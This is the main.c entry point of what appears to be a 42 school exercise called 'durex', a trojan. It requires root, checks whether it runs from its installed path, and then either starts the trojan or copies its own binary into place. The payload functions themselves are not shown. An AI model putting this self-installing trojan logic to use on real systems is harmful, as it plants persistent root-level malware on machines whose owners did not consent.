/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mdufaud <mdufaud@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/05/17 17:38:19 by mdufaud           #+#    #+#             */
/*   Updated: 2018/05/20 21:43:27 by mdufaud          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"
#include <sys/param.h>

int				is_infected(char *path)
{
	char	actualpath[PATH_MAX + 1];
	char	*ptr;

	ptr = realpath(path, actualpath);
	if (!ft_strcmp(ptr, EXE_PATH))
		return (1);
	return (0);
}

int				main(int argc, char **argv)
{
	if (argc > 2)
		return (1);
	if (getuid() != 0)
	{
		ft_putendl("You need to be root to start "TROJAN_NAME);
		return (1);
	}
	if (argc == 2 && getenv("DUREX_DEBUG"))
	{
		ft_putendl(TROJAN_NAME" - debug mode");
		start_trojan(argv[0]);
		return (0);
	}
	if (is_infected(argv[0]))
		start_trojan(argv[0]);
	else if (duplicate_bin(argv[0]))
		ft_putendl(TROJAN_NAME);
	return (0);
}
